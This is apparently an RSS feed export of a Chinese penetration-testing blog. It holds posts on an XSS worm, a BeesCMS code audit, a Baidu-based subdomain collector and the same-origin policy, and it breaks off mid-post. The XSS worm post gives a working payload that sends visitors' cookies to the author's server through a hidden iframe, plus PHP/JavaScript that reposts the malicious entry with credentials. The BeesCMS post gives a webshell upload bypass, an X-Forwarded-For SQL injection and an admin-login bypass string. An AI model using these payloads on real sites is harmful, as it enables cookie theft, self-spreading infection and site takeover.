&apos;o&apos;:&apos;90&apos;,&apos;p&apos;:&apos;8f&apos;, &apos;q&apos;:&apos;8e&apos;, &apos;r&apos;:&apos;8d&apos;, &apos;s&apos;:&apos;8c&apos;, &apos;t&apos;:&apos;8b&apos;,</span><br><span class="line"> &apos;u&apos;:&apos;8a&apos;, &apos;v&apos;:&apos;89&apos;, &apos;w&apos;:&apos;88&apos;, &apos;x&apos;:&apos;87&apos;, &apos;y&apos;:&apos;86&apos;,&apos;z&apos;:&apos;85&apos;,&apos;.&apos;:&apos;d1&apos;,&apos;/&apos;:&apos;d0&apos;,&apos;:&apos;:&apos;c5&apos;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/03/31/URLRedirect/7.jpg" alt></p><blockquote><p>我寻了半生的春天，你一笑便是了。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;green&quot;&gt;URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式&lt;/font&gt;&lt;br&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>XSSWORM</title>
    <link href="http://yoursite.com/2019/03/31/xssworm/"/>
    <id>http://yoursite.com/2019/03/31/xssworm/</id>
    <published>2019-03-30T16:00:00.000Z</published>
    <updated>2019-03-31T12:39:56.793Z</updated>
    
    <content type="html"><![CDATA[<font color="green">一个不错的XSSWORM需要许多知识，总的来说还是很有趣的</font><a id="more"></a><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><font color="dark">利用条件</font></h3><ul><li><p>可以利用的XSS</p><p>例如个人档案，留言处，发表的文章，发表的动态之类的</p></li><li><p>可控点</p><p>XSS存在处的CSRF</p></li></ul><h3 id="所需知识"><a href="#所需知识" class="headerlink" title="所需知识"></a><font color="dark">所需知识</font></h3><ul><li>XSS</li><li>Ajax 隐蔽的发送请求</li><li>同源策略 <a href="http://noel.xin/2019/02/15/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#more" target="_blank" rel="noopener">http://noel.xin/2019/02/15/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/#more</a></li></ul><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a><font color="dark">实现步骤</font></h3><ol><li>发现可利用的XSS，以留言处为例</li><li>发表留言处存在CSRF</li><li>发表带有XSS的留言，XSS的作用是发布留言同时可以做一些其他事，例如获取Cookie</li><li>用户被感染，留言传播</li></ol><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a><font color="dark">实例分析</font></h3><p>以某游记系统为例具体分析一下</p><p>发表游记的参数中有一个直接输出，得到一枚储存型XSS</p><p><img src="/2019/03/31/xssworm/1.png" alt></p><p>想要构成worm,我们需要让其他看了这篇游记的人也发表一篇带有恶意代码的游记</p><p>回到发表游记处，这里存在一个CSRF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"id"</span>:<span class="string">"******"</span>,<span class="string">"userId"</span>:<span class="string">"*****"</span>,<span class="string">"userName"</span>:<span class="string">"******"</span>,<span class="string">"AssociateEntityList"</span>:[&#123;<span class="string">"brandId"</span>:<span class="number">134</span>,<span class="string">"brandName"</span>:<span class="string">"ABT"</span>,</span><br><span class="line"><span class="string">"seriesId"</span>:<span class="number">2366</span>,<span class="string">"seriesName"</span>:<span class="string">"ABT A3"</span>&#125;]</span><br><span class="line"> ............</span><br></pre></td></tr></table></figure><p>不过这里有一点儿问题</p><p>这里有id,userID,以及userName</p><p>后面经过测试发现发表游记的时候id和userName都可以为空，那么问题来了，userId怎么获得呢？</p><p>别忘了我们已经有一个储存型XSS了</p><p>发现Cookie里有一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userid=97***548</span><br></pre></td></tr></table></figure><p><strong>通过XSS将Cookie发送到自己的服务器上，同时对Cookie进行处理，得到userId,并进行CSRF操作</strong></p><p>可能有些同学这时候就有疑问了，为什么不直接用JavaScript处理呢？</p><p>原因是发表游记时值是Json的形式，使用JS很容易出错，如果使用转义符的话最后输出的时候转义符也会在，最后迫不得已选择了上述操作</p><p>我们可以构造储存型XSS啦！</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> o=<span class="built_in">document</span>.body;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);a.src=<span class="string">"http://noel.xin/cookie.php?Cookie="</span>+<span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="undefined">    a.style.opacity=0;</span></span><br><span class="line"><span class="undefined">o.appendChild(a);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用得到的userID发表游记</p><p>index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$Cookie = @$_GET[&apos;Cookie&apos;]?$_GET[&apos;Cookie&apos;]:&apos;&apos;;</span><br><span class="line">$start = strpos($Cookie,&quot;userid&quot;)+10;</span><br><span class="line">$id = substr($Cookie,$start,8);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var req = new XMLHttpRequest();</span><br><span class="line">    var data = &quot;jsonData=&#123;&apos;id&apos;:0,&apos;userId&apos;:&lt;?=$id?&gt;,&apos;userName&apos;:&apos;&apos;,&apos;XSS&apos;:&apos;上述代码&apos;&#125;&quot;;</span><br><span class="line">    req.open(&apos;post&apos;,&apos;https://target.com&apos;,true);</span><br><span class="line">    req.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded;&quot;);</span><br><span class="line">    req.withCredentials = true;</span><br><span class="line">    req.send(data);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>完成！</p><p>之后只要别人看了我发的游记后都会发一篇带有恶意代码的XSS，当然，为了爱和正义，文章立刻给删了。</p><blockquote><p>也许不能喜欢你到天边的花火都枯萎，但真的梦想过与你，并肩去看一场烟火</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;font color=&quot;green&quot;&gt;一个不错的XSSWORM需要许多知识，总的来说还是很有趣的&lt;/font&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>BeesCMS 代码审计</title>
    <link href="http://yoursite.com/2019/03/30/bees/"/>
    <id>http://yoursite.com/2019/03/30/bees/</id>
    <published>2019-03-29T16:00:00.000Z</published>
    <updated>2019-03-30T14:57:44.593Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">挺简单一套CMS，找SQL注入的时候脑残了</font><br><a id="more"></a></p><h3 id="后台直接上传WebShell"><a href="#后台直接上传WebShell" class="headerlink" title="后台直接上传WebShell"></a>后台直接上传WebShell</h3><p>漏洞位于/admin/admin_pic_upload.php</p><p>直接看上传相关的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_uploaded_file($v))&#123;</span><br><span class="line">$pic_info[<span class="string">'tmp_name'</span>]=$v;</span><br><span class="line">$pic_info[<span class="string">'size'</span>]=$_FILES[<span class="string">'up'</span>][<span class="string">'size'</span>][$k];</span><br><span class="line">$pic_info[<span class="string">'type'</span>]=$_FILES[<span class="string">'up'</span>][<span class="string">'type'</span>][$k];</span><br><span class="line">$pic_info[<span class="string">'name'</span>]=$_FILES[<span class="string">'up'</span>][<span class="string">'name'</span>][$k];</span><br><span class="line">$pic_name_alt=<span class="keyword">empty</span>($is_alt)?<span class="string">''</span>:$pic_alt[$k];</span><br><span class="line">$is_up_size = $_sys[<span class="string">'upload_size'</span>]*<span class="number">1000</span>*<span class="number">1000</span>;</span><br><span class="line">$value_arr=up_img($pic_info,$is_up_size,<span class="keyword">array</span>(<span class="string">'image/gif'</span>,<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/jpg'</span>,<span class="string">'image/bmp'</span>,<span class="string">'image/pjpeg'</span>,<span class="string">'image/x-png'</span>),$up_is_thumb,$up_thumb_width,$up_thumb_height,$logo=<span class="number">1</span>,$pic_name_alt);</span><br><span class="line"><span class="comment">//处理上传后的图片信息</span></span><br><span class="line">$pic_name=$value_arr[<span class="string">'up_pic_name'</span>];<span class="comment">//图片名称空</span></span><br><span class="line">$pic_ext=$value_arr[<span class="string">'up_pic_ext'</span>];<span class="comment">//图片扩展名</span></span><br><span class="line">$pic_title = $pic_alt[$k];<span class="comment">//图片描述</span></span><br><span class="line">$pic_size = $value_arr[<span class="string">'up_pic_size'</span>];<span class="comment">//图片大小</span></span><br><span class="line">$pic_path = $value_arr[<span class="string">'up_pic_path'</span>];<span class="comment">//上传路径</span></span><br><span class="line">$pic_time = $value_arr[<span class="string">'up_pic_time'</span>];<span class="comment">//上传时间</span></span><br><span class="line">$pic_thumb = iconv(<span class="string">'GBK'</span>,<span class="string">'UTF-8'</span>,$value_arr[<span class="string">'thumb'</span>]);<span class="comment">//缩略图</span></span><br><span class="line">$cate = <span class="keyword">empty</span>($pic_cate)?<span class="number">1</span>:$pic_cate;<span class="comment">//图片栏目</span></span><br><span class="line"><span class="comment">//入库</span></span><br><span class="line">$sql=<span class="string">"insert into "</span>.DB_PRE.<span class="string">"uppics (pic_name,pic_ext,pic_alt,pic_size,pic_path,pic_time,pic_thumb,pic_cate) values ('"</span>.$pic_name.<span class="string">"','"</span>.$pic_ext.<span class="string">"','"</span>.$pic_title.<span class="string">"','"</span>.$pic_size.<span class="string">"','"</span>.$pic_path.<span class="string">"','"</span>.$pic_time.<span class="string">"','"</span>.$pic_thumb.<span class="string">"',"</span>.$cate.<span class="string">")"</span>;</span><br><span class="line">$mysql-&gt;query($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>up_img函数用来判断文件类型，原函数为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">up_img($file,$size,$type,$thumb=<span class="number">0</span>,$thumb_width=<span class="string">''</span>,$thumb_height=<span class="string">''</span>,$logo=<span class="number">1</span>,$pic_alt=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>这里的type很明显是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="string">'image/gif'</span>,<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/jpg'</span>,<span class="string">'image/bmp'</span>,<span class="string">'image/pjpeg'</span>,<span class="string">'image/x-png'</span>)</span><br></pre></td></tr></table></figure><p>这一串，也就是说这是一个只检测Content-Type的函数</p><p><img src="/2019/03/30/bees/upload1.png" alt></p><p>轻松搞定</p><h3 id="用户咨询鸡肋越权"><a href="#用户咨询鸡肋越权" class="headerlink" title="用户咨询鸡肋越权"></a>用户咨询鸡肋越权</h3><p>/member/member.php</p><p>看修改咨询处代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">$id=intval(fl_value($_GET[<span class="string">'id'</span>]));</span><br><span class="line">$member_id=intval(fl_value($_GET[<span class="string">'member_id'</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($id))&#123;<span class="keyword">die</span>(<span class="string">"&lt;script type=\"text/javascript\"&gt;alert('&#123;$language['msg_info10']&#125;');history.go(-1);&lt;/script&gt;"</span>);&#125;</span><br><span class="line">$sql=<span class="string">"select*from "</span>.DB_PRE.<span class="string">"ask where id=&#123;$id&#125; and member=&#123;$member_id&#125;"</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>只要知道id以及咨询的id即可得知别人的咨询，当然也可以通过遍历，并没什么卵用</p><h3 id="产品购买处存在SQL注入"><a href="#产品购买处存在SQL注入" class="headerlink" title="产品购买处存在SQL注入"></a>产品购买处存在SQL注入</h3><p>/mx_form/order_save.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$addtime=time();</span><br><span class="line">$ip=fl_value(get_ip());</span><br><span class="line">$ip=fl_html($ip);</span><br><span class="line">$member_id=<span class="keyword">empty</span>($_SESSION[<span class="string">'id'</span>])?<span class="number">0</span>:$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">$arc_id=<span class="keyword">empty</span>($f_id)?<span class="number">0</span>:intval($_POST[<span class="string">'f_id'</span>]);</span><br><span class="line">$sql=<span class="string">"insert into "</span>.DB_PRE.<span class="string">"formlist (form_id,form_time,form_ip,member_id,arc_id) values (&#123;$form_id&#125;,&#123;$addtime&#125;,'&#123;$ip&#125;','&#123;$member_id&#125;','&#123;$arc_id&#125;')"</span>;</span><br><span class="line">$mysql-&gt;query($sql);</span><br></pre></td></tr></table></figure><p>IP经过fl_value以及fl_html处理</p><p>先来看下fl_value</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($str))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">'/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i'</span>,<span class="string">''</span>,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出有许多问题，首先是将一些敏感字符替换为空，替换为空，替换为空！！！</p><p>问题似乎很简单了</p><p>再来看下fl_html</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> htmlspecialchars($str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用了htmlspecialchars进行转义，那么这又是何方神圣呢</p><p>看下官方解释</p><table><thead><tr><th style="text-align:left">字符</th><th style="text-align:left">替换后</th></tr></thead><tbody><tr><td style="text-align:left"><em>&amp;</em> (&amp; 符号)</td><td style="text-align:left"><em>&amp;</em></td></tr><tr><td style="text-align:left"><em>“</em> (双引号)</td><td style="text-align:left"><em>&quot;</em>，除非设置了 <strong>ENT_NOQUOTES</strong></td></tr><tr><td style="text-align:left"><em>‘</em> (单引号)</td><td style="text-align:left">设置了 <strong>ENT_QUOTES</strong> 后， <em>&#039;</em> (如果是 <strong>ENT_HTML401</strong>) ，或者 <em>&apos;</em> (如果是 <strong>ENT_XML1</strong>、 <strong>ENT_XHTML</strong> 或 <strong>ENT_HTML5</strong>)。</td></tr><tr><td style="text-align:left"><em>&lt;</em> (小于)</td><td style="text-align:left"><em>&lt;</em></td></tr><tr><td style="text-align:left"><em>&gt;</em> (大于)</td><td style="text-align:left"><em>&gt;</em></td></tr></tbody></table><p>其作用是将一些敏感字符替换掉，那么注意了，这里之说当指定了ENT_QUOTES后单引号才会被替换！！！</p><p>看来这两个函数对我们并没有什么影响了呢</p><p>在购买处填写好消息，然后提交</p><p>增加X-Forwarded-For</p><p><code>X-Forwarded-For: lalala&#39;,&#39;0&#39;,&#39;&#39; or updatexml(1,concat(0x7e,user(),0x7e),1))#</code></p><p><img src="/2019/03/30/bees/sql1.png" alt></p><p>该CMS基本上都是采用这两个函数进行过滤，也就是说，这个CMS到处是注入！！</p><p>后台处：</p><p>账号:’ unselection selselectect 1,2,md5(3),4,0#</p><p>密码:3</p><p>可以直接登陆后台</p><p>进入后台利用上传处漏洞可GETSHELL</p><blockquote><p>我愿千金散尽只为赠你火树银花；我愿点亮夜空只为你灿烂一笑。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;挺简单一套CMS，找SQL注入的时候脑残了&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Subdomain Collect Plan</title>
    <link href="http://yoursite.com/2019/03/21/subdomin/"/>
    <id>http://yoursite.com/2019/03/21/subdomin/</id>
    <published>2019-03-20T16:00:00.000Z</published>
    <updated>2019-03-21T07:47:30.263Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">咕咕咕</font><br><a id="more"></a></p><h3 id="3-21"><a href="#3-21" class="headerlink" title="3/21"></a>3/21</h3><p>基础版本,利用百度API收集子域名<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#Author: Noel</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment">#API URL</span></span><br><span class="line">BDURL = <span class="string">"http://ce.baidu.com/index/getRelatedSites?site_address="</span></span><br><span class="line">URLS = set(&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">baidu</span><span class="params">(url)</span>:</span></span><br><span class="line">    res = requests.get(BDURL+url)</span><br><span class="line">    a = json.loads(res.text)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a[<span class="string">'data'</span>]:</span><br><span class="line">        URLS.add(i[<span class="string">'domain'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#Parameter Processing</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Collect Subdomain.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--domain'</span>,<span class="string">'-d'</span>,required=<span class="literal">True</span>,help=<span class="string">'target domain'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--file'</span>,<span class="string">'-f'</span>,help=<span class="string">'save file name.default is domain.txt'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#GET Subdomain</span></span><br><span class="line">    baidu(args.domain)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Subdomain Processing</span></span><br><span class="line">    print(<span class="string">'[+]Collect Complete.'</span>)</span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        <span class="keyword">with</span> open(args.file,<span class="string">'w'</span>) <span class="keyword">as</span> wf:</span><br><span class="line">            wf.write(<span class="string">'\n'</span>.join(URLS))</span><br><span class="line">        print(<span class="string">'[+]File Saved in'</span>,args.file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'domain.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> wf:</span><br><span class="line">            wf.write(<span class="string">'\n'</span>.join(URLS))</span><br><span class="line">        print(<span class="string">'[+]File Saved in domain.txt'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="持续更新"><a href="#持续更新" class="headerlink" title="持续更新"></a>持续更新</h3><p>咕咕咕</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;green&quot;&gt;咕咕咕&lt;/font&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="开发" scheme="http://yoursite.com/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>关于同源策略</title>
    <link href="http://yoursite.com/2019/02/15/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <id>http://yoursite.com/2019/02/15/同源策略/</id>
    <published>2019-02-14T16:00:00.000Z</published>
    <updated>2019-02-15T15:15:27.854Z</updated>
    
    <content type="html"><![CDATA[<p><font color="green">最近挖洞总是遇到CORS之类的，索性就再次了解下同源策略</font><br><a id="more"></a></p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><font color="dark">介绍</font></h3><p>说到同源策略，经常会有这么一张图<br><img src="/2019/02/15/同源策略/1.png" alt><br>那我们从头分析这是个什么意思</p><ul><li>第一个是http协议，而第三个是https协议，协议不同</li><li>第一个是80端口，第四个是81端口，端口不同</li><li>第一个的主机名是store.company.com,第五个的是news.company.com,不同主机名<br>也就是说只有<strong>协议</strong>，<strong>端口</strong>，<strong>主机名</strong>，都相同的情况下才满足同源策略<br>那么这有什么用呢？当然是在某种程度上减轻了恶意脚本执行造成的危害，举个栗子<br>A登陆了a.com,并且在新的标签页打开了有恶意读取Cookie的b.com,这个时候由于同源策略，a.com的CooKie就不会被读取到<br>a网站<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">"Cookie"</span>,<span class="string">"admin"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert(document.cookie);&lt;/script&gt;"</span>;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/15/同源策略/2.png" alt><br>b网站<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/15/同源策略/3.png" alt></p><p>当a.com想要调用b.com的API的时候同源策略也会进行阻止<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(xhr.responseText);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    xhr.open(<span class="string">"GET"</span>, <span class="string">"http://b.com/get?id=1"</span>);</span></span><br><span class="line"><span class="undefined">    xhr.send();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/15/同源策略/4.png" alt></p><h3 id="跨域请求"><a href="#跨域请求" class="headerlink" title="跨域请求"></a><font color="dark">跨域请求</font></h3><p>刚刚还在说禁止跨域，怎么现在就出现了跨域请求呢？<br>一般而言，网络请求可以大体分为三类</p><ul><li>跨域写，通常被允许，像重定向，提交表单之类的都属于这个了</li><li>跨域嵌入，通常被允许，像<code>&lt;script&gt;</code>,<code>&lt;link&gt;</code>,<code>&lt;img&gt;</code> 之类的都是允许的</li><li>跨域读，通常被禁止，但是脚本还是执行了，只不过禁止读取回复<br>同源策略影响范围包括：普通的HTTP请求、XMLHttpRequest、XSLT、XBL。</li></ul><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a><font color="dark">CORS</font></h3><p>CORS又是什么东西呢？上面已经提到，在嵌入外域数据时，同源策略并不会起到作用，但是，XMLHttpRequest就有些难受啦<br>，只能发送数据，但是不能查看返回信息,当然，<em>CSRF</em>的话只要发送数据成功就已经OK啦，而CORS 策略，则是允许 Web 应<br>用程序进行跨域访问<br>CORS通过一些特殊的 HTTP 头来确保哪些源站可以请求哪些资源<br>通常而言，在跨域前会发送一个OPTIONS头的请求包，如果请求包内容检查通过，才会发送真正的请求<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">OPTIONS /c HTTP/1.1</span><br><span class="line">Host: b.a.com</span><br><span class="line">Connection: close</span><br><span class="line">Origin: http://b.a.com</span><br><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: Content-Type</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 15 Feb 2019 14:50:45 GMT</span><br><span class="line">Server: Tengine</span><br><span class="line">Access-Control-Allow-Origin: http://*.a.com</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: Content-Type</span><br><span class="line">Access-Control-Max-Age: 86400</span><br><span class="line">Vary: Accept-Encoding, Origin</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout=2, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure></p><p>先来看请求头，其中的Origin表示发起请求的主机名，而返回头中有一个<code>Access-Control-Allow-Origin</code>，如果请求的Origin不在这个范围内，检查不通过。<br><code>Access-Control-Request-Method</code>是请求的方法，<code>Access-Control-Allow-Methods</code>是允许的方法<br><code>Access-Control-Request-Headers</code>同</p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a><font color="dark">JSONP</font></h3><p>JSONP跨域巧妙的利用了script标签能跨域的特点,实现了json的跨域传输。<br>随便找了个有callback的网站<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span 